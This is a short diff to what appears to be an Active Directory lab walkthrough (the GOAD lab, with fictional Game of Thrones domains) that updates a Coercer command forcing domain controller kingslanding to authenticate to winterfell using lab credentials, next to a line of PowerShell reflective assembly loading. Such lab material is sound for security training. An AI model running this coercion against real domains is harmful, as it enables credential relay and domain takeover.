@@ -97,7 +97,7 @@ $assem = [System.Reflection.Assembly]::Load($data);
 - And now force a coerce of the DC kingslanding to the DC winterfell.
 
 ```bash
-python3 coercer.py -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell
+coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell.north.sevenkingdoms.local --always-continue
 ```
 
 - We look on the triage again :
